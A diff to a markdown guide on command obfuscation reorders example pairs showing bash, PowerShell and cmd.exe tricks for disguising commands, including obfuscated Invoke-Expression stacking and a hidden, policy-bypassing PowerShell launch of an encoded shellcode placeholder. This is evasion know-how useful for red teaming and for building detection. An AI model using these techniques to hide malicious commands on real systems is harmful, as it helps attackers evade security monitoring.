@@ -163,13 +163,13 @@ The above string can be obfuscated using **bash special characters: '** or **\\*
 
 - Using **rev <<<** to reverse the order of characters in a string
 
-      OBFUSCATED   : rev <<< 'm- klbsl' |$0
       DE-OBFUSCATED: lsblk -m
+      OBFUSCATED   : rev <<< 'm- klbsl' |$0
 
 ![bash rev obfuscation](http://i.cubeupload.com/lsyzo5.png)
 
-      OBFUSCATED   : rev <<< i$@ma\o$@hw |$0
       DE-OBFUSCATED: whoami
+      OBFUSCATED   : rev <<< i$@ma\o$@hw |$0
 
 ![bash rev obfuscation](http://i.cubeupload.com/Q7qgFW.png)
 `HINT: Single quotes are not allowed in Combining rev <<< and the batch (\) escape character`
@@ -325,16 +325,15 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 - Using **splatting + reorder** (-f) obfuscation technic
 
-      OBFUSCATED    : ("{0}{2}{1}{3}" -f'vice','Ser','G','et-')
       DE-OBFUSCATED : Get-Service
+      OBFUSCATED    : ("{0}{2}{1}{3}" -f'vice','Ser','G','et-')
 
 ![powershell obfuscation](http://i.cubeupload.com/1hy2GA.jpg)
 
 - **Stacking** commands together with the **&** caret
 
-      OBFUSCATED    :("{0}{2}{1}{3}" -f'Invoke','es','-Expr','sion') (&( "{0}{2}{1}" -f'(New','ject)','-Ob'))
       DE-OBFUSCATED : Invoke-Expression (New-Object)
-
+      OBFUSCATED    :("{0}{2}{1}{3}" -f'Invoke','es','-Expr','sion') (&( "{0}{2}{1}" -f'(New','ject)','-Ob'))
 ---
 
 - Another way to use **splatting + reorder** technic to remote download/execute agent
@@ -517,8 +516,8 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 <br />
 
-      OBFUSCATED    : @c^Md%i:~63,1%e^xE %i:~62,1%c pO^w%U7%he^L^l%i:~63,1%e^xE %H%%E0%p -%i:~25,1%%i:~44,1%n^D %i:~7,1%id^D%k8% %H%ex^EC %i:~1,1%%i:~24,1%P^a%i:~53,1%s %H%n^o%w2% -%k8%c $ENCODED-SHELLCODE-STRING
       DE-OBFUSCATED : cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $ENCODED-SHELLCODE-STRING
+      OBFUSCATED    : @c^Md%i:~63,1%e^xE %i:~62,1%c pO^w%U7%he^L^l%i:~63,1%e^xE %H%%E0%p -%i:~25,1%%i:~44,1%n^D %i:~7,1%id^D%k8% %H%ex^EC %i:~1,1%%i:~24,1%P^a%i:~53,1%s %H%n^o%w2% -%k8%c $ENCODED-SHELLCODE-STRING
 
 ---
 
